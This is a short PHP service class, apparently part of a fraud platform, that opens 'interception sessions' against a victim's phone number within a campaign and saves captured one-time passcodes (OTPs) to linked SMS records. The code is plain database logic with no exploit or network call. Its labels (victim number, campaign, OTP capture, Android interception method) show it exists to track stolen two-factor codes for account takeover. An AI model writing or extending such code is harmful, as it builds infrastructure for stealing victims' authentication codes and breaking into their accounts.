<?php

namespace App\Services;

use App\Models\InterceptionSession;
use App\Models\Sms;

class InterceptionService
{
    /**
     * Create a new interception session for a victim number.
     */
    public function start(int $userId, int $campaignId, string $victimNumber, string $method = 'android'): InterceptionSession
    {
        return InterceptionSession::create([
            'user_id'             => $userId,
            'campaign_id'         => $campaignId,
            'victim_number'       => $victimNumber,
            'interception_method' => $method,
            'status'              => 'active',
        ]);
    }

    /**
     * Complete a session once the OTP is captured.
     */
    public function complete(InterceptionSession $session, ?string $otpCode): void
    {
        $session->complete($otpCode);

        // Also update the linked SMS record
        if ($otpCode) {
            $sms = Sms::belongsToUser()->where('mobile_number', $session->victim_number)
                ->where('campaign_id', $session->campaign_id)
                ->first();
            if ($sms) {
                $sms->otp_code = $otpCode;
                $sms->save();
            }
        }
    }
}